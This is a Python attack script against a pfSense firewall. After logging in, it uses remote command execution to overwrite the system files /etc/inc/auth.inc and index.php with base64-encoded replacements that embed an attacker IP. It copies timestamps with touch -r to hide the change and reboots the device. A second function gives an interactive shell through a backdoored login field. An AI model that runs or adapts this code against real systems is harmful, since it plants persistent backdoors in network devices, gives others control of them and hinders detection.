import utils
import base64
from time import sleep

def leetUpload(details):

    ## auth.inc
    auth = "echo '"
    with open('WebFiles/auth.inc', 'r') as file:
        data = file.read()
    data_mod = data.replace("HEYBEAR", details.iplong).encode("ascii")
    auth += base64.b64encode(data_mod).decode("ascii")
    auth += "' > temp_cache"


    authcmd = """php -r '$file = file_get_contents("temp_cache", true);echo base64_decode($file);' > /etc/inc/auth.inc"""
    authtad = "touch -r index.php /etc/inc/auth.inc"

    ## index.php
    authindex = "echo '"
    with open('WebFiles/index.php', 'r') as file:
        data = file.read().encode("ascii")
    file.close()
    authindex += base64.b64encode(data).decode("ascii")
    authindex += "' > temp_cache"


    authindexcmd = """php -r '$file = file_get_contents("temp_cache", true);echo base64_decode($file);' > index.php"""
    authindextad = "touch -r /etc/inc/auth.inc index.php"

    utils.simpleGET(details, "/", "", 0)
    utils.loginPOST(details)
    try:
        # auth.inc
        utils.cmdGET(details, auth)
        utils.cmdGET(details, authcmd)
        utils.cmdGET(details, authtad)
        # index.php
        utils.cmdGET(details, authindex)
        utils.cmdGET(details, authindexcmd)
        utils.cmdGET(details, authindextad)
        print("Upload Complete!")
    except:
        print("Upload failed")


    # I'm aware of how jank the follow lines are

    try:
        utils.cmdGET(details,"reboot")
    except:
        # The command "fails" due to pfsense rebooting
        print("Pfsense Rebooting.....")
        


def leetAccess(details):
    cmd = b"" 
    encoding = "utf-8"

    while(cmd.decode(encoding).lower() != "quit"):
        cmd = input("$: ").encode("ascii")
        cmd_encoded = base64.b64encode(cmd).decode("ascii")

        utils.simpleGET(details, "/", "", 0)
        leet_data = {"__csrf_magic": details.csrf, "logindata": cmd_encoded}
        utils.simplePOST(details, "/", "", 1, leet_data)

